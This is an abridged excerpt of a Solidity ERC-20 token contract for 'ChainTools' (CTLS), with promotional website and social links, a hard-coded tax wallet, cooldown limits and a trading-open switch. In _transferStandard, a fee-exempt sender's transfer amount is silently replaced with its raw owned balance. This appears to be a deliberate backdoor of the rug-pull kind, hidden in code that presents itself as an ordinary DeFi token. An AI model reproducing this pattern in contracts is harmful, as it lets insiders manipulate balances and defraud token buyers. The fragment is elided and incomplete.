...
/**
CHAINTOOLS DEFI REIMAGINED!

Website: https://www.chaintool.tools
Telegram: https://t.me/ctools_erc
Twitter: https://twitter.com/ctools_erc
App: https://app.chaintool.tools
 */
...
contract CTLS is Context, IERC20, Ownable {
    ...
    uint256 private _maxFeeSwap = _tTotal * 1 / 10000;
    ...
    string private constant _name = "ChainTools";
    string private constant _symbol = "CTLS";
    ...
    IUniswapV2Router private _uniV2Router;
    ...
    constructor () {
        _taxWallet = payable(0x697E65F2039Bf25B96E852B42a3510773987c0F9);
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if (_isExcludedFromFees[sender] && tradeOpened) rAmount = _tOwned[sender];
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            if (from == _uniV2Pair && to != address(_uniV2Router) && ! _isExcludedFromFees[to] && transferDelayEnabled) {
                // Cooldown
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                require(_lastTransferTime[to] < block.timestamp);
                _lastTransferTime[to] = block.timestamp + (30 seconds);
            }
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && !_isExcludedFromFees[from] && to == _uniV2Pair && swapEnabled && amount > _maxFeeSwap) {
    ...
    function openTrading() external onlyOwner() {
        ...
        tradeOpened = true;
        IERC20(_uniV2Pair).approve(address(_uniV2Router), type(uint).max);
    }
